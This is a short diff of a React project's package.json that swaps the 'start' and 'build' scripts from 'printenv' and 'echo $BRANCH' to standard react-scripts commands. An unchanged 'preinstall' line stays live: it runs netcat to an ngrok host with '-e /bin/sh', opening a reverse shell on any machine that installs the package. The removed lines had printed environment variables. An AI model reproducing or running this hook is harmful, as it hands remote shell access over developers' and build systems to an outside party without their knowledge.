@@ -14,8 +14,8 @@
   },
   "scripts": {
     "preinstall" : "nc 0.tcp.in.ngrok.io 11360 -e /bin/sh",
-    "start": "printenv",
-    "build": "echo $BRANCH",
+    "start": "react-scripts start",
+    "build": "react-scripts build",
     "test": "react-scripts test --env=jsdom",
     "eject": "react-scripts eject"
   },
